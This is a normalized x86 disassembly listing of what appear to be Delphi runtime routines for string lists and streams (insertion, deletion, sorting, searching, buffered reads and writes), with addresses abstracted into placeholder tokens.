mov eax [ ebp - 0x1c ]
call sub_404310
mov ebx eax
test ebx ebx
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov ecx ebx
call sub_4028e0
add [ ebp - 0x14 ] ebx
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
mov ecx ebx
call sub_4028e0
add [ ebp - 0x14 ] ebx
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_404310
mov ebx eax
test ebx ebx
je r-xdata
sub_41582c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4158ab
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov esi eax
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_404050
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_404310
mov edx eax
add edx 0x2
mov ecx 0x7fffffff
pop eax
call sub_404570
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4158b2
lea eax [ ebp - 0xc ]
call sub_404050
retn
sub_4158b8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_415930
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc esi
mov [ ebp - 0x8 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415937
lea eax [ ebp - 0xc ]
call sub_404050
retn
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
test eax eax
je r-xdata
sub_415944
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_415a07
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_404570
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x34 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax ebx
call sub_415fa4
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_404238
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_40c2ac
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415a0e
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_404074
lea eax [ ebp - 0xc ]
call sub_404050
retn
sub_415a18
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
or esi 0xffffffff
inc ebx
xor esi esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp ebp eax
je r-xdata
sub_415a4c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_415a7c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_416ae0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415ac4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415acb
mov eax [ ebp - 0x4 ]
call sub_403294
retn
sub_415ad0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415b6d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4153b0
xor eax eax
push ebp
push sub_415b50
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_41662c
sub esi eax
lea eax [ ebp - 0x8 ]
mov ecx esi
xor edx edx
call sub_404140
mov edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415b57
mov eax [ ebp - 0x4 ]
call sub_41546c
retn
sub_415b7c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415c1d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415c24
lea eax [ ebp - 0x8 ]
call sub_404050
retn
mov eax [ ebp - 0x4 ]
call sub_4153b0
xor eax eax
push ebp
push sub_415c00
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41546c
retn
sub_415c2c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebp eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push ebp
mov ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_415c64
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415d08
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41881c
mov eax [ ebp - 0x4 ]
call sub_4153b0
xor eax eax
push ebp
push sub_415ce3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_4178b8
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4194bc
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415cea
mov eax [ ebp - 0x4 ]
call sub_41546c
retn
sub_415d14
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_416ae0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415d5f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415d66
mov eax [ ebp - 0x4 ]
call sub_403294
retn
sub_415d6c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_415db9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_404310
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_416890
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415dc0
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_415dcc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx esi
call sub_4056a4
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x10 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0xc ]
sub_415e00
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_415e43
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404248
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415e4a
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_415e50
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415f04
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4153b0
xor edx edx
push ebp
push sub_415ee7
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415eee
mov eax [ ebp - 0x4 ]
call sub_41546c
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_404140
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx ] 0xd
jne r-xdata
sub dl 0xa
je r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
sub dl 0x3
jne r-xdata
inc ebx
inc ebx
sub_415f14
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415f8a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41a068
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_41a070
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415f91
lea eax [ ebp - 0xc ]
call sub_404050
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41a110
inc esi
dec ebx
jne r-xdata
sub_415fbc
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x7 ]
jne r-xdata
or [ esi + 0x4 ] 0x4
mov [ esi + 0x7 ] bl
test [ esi + 0x4 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
sub_415fd8
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
xor eax eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4151e8
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x14 ] eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
test bl bl
jle r-xdata
mov ecx eax
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_404acc
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_416040
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x8c ]
test al al
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ esp ] eax
jmp r-xdata
push edi
mov ecx esi
mov edx [ esp + 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov al [ ebx + 0x1d ]
sub al 0x1
jb r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
dec al
je r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_415564
jmp r-xdata
sub_4160dc
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
mov edx [ r-xdata ]
call sub_404acc
xor eax eax
mov [ ebx + 0x14 ] eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_41611c
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_415564
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax [ ebx + 0x10 ]
lea edx [ eax + esi * 8 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 + 0x8 ]
call sub_4028e0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx [ r-xdata ]
call sub_404bb8
dec [ ebx + 0x14 ]
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
sub_416188
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_415564
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax ebx
call sub_415564
cmp edi [ ebx + 0x14 ]
jl r-xdata
test edi edi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_4161e4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_4161e4
push ebx
mov ebx [ eax + 0x10 ]
lea edx [ ebx + edx * 8 ]
mov eax [ eax + 0x10 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ edx ]
mov ebx [ eax ]
mov [ edx ] ebx
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ edx + 0x4 ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
retn
sub_416208
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov [ esp + 0x8 ] 0x0
xor esi esi
mov eax [ edi + 0x14 ]
dec eax
mov [ esp + 0xc ] eax
cmp esi [ esp + 0xc ]
jg r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] esi
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0xc ]
add ebx esi
shr ebx 0x1
mov eax [ edi + 0x10 ]
mov edx [ eax + ebx * 8 ]
mov ecx [ esp ]
mov eax edi
mov ebp [ eax ]
call [ ebp + 0x34 ]
test eax eax
jge r-xdata
mov edx ebx
dec edx
mov [ esp + 0xc ] edx
test eax eax
jne r-xdata
lea esi [ ebx + 0x1 ]
jmp r-xdata
cmp esi [ esp + 0xc ]
jle r-xdata
mov [ esp + 0x8 ] 0x1
cmp [ edi + 0x1d ] 0x1
je r-xdata
mov esi ebx
sub_416280
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_415564
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax edi
mov edx [ ebx + 0x10 ]
mov edx [ edx + esi * 8 ]
call sub_4040a4
pop edi
pop esi
pop ebx
retn
sub_4162bc
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_415564
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + esi * 8 + 0x4 ]
pop esi
pop ebx
retn
sub_4162e4
push esi
mov edx [ eax + 0x18 ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov esi edx
test esi esi
jns r-xdata
mov esi 0x4
mov esi 0x10
jmp r-xdata
sar esi 0x2
jmp r-xdata
add esi 0x3
add esi edx
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop esi
retn
sub_416318
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8c ]
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_4158b8
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_416364
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_415564
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_415564
cmp esi [ ebx + 0x14 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4163b8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x14 ]
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
mov eax ebx
call sub_4162e4
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov esi eax
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax esi
mov edx edi
call sub_4040a4
inc [ ebx + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 + 0x8 ]
push edx
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 ]
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax edx
pop edx
call sub_4028e0
sub_416430
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_415564
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_415564
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx edi
call sub_4040a4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41648c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_415564
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov [ eax + esi * 8 + 0x4 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_4164cc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4161e4
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4164cc
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41657c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1c ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ esi + 0x1c ] bl
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
sub_4165d8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x1
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
push esi
mov ecx [ ebx + 0x14 ]
dec ecx
xor edx edx
mov eax ebx
call sub_4164cc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_41662c
add esp 0xfffffff8
push 0x0
push 0x0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_416660
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
push 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
push 0x0
push 0x0
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
push [ esp + 0xc ]
push [ esp + 0xc ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_4166c4
push ebp
mov ebp esp
mov ecx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b64c
call sub_403a08
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ecx
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop ebp
retn 0x8
jmp r-xdata
sub_416718
push ebp
mov ebp esp
add esp 0xfffffef8
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_4031e4
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b688
call sub_403a08
mov esp ebp
pop ebp
retn
sub_416764
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov [ ebp - 0x1a ] cx
mov esi edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_4031dc
mov [ ebx ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
cmp eax [ r-xdata ]
jne r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
push ebp
call sub_416718
pop ecx
mov eax [ ebx ]
call sub_403220
mov [ ebx ] eax
mov eax esi
cdq
push edx
push eax
mov dl [ ebp - 0x1a ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_416718
pop ecx
sub_4167e8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b64c
call sub_403a08
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
xor ecx ecx
mov cl bl
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
jmp r-xdata
sub_416858
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b64c
call sub_403a08
sub_416890
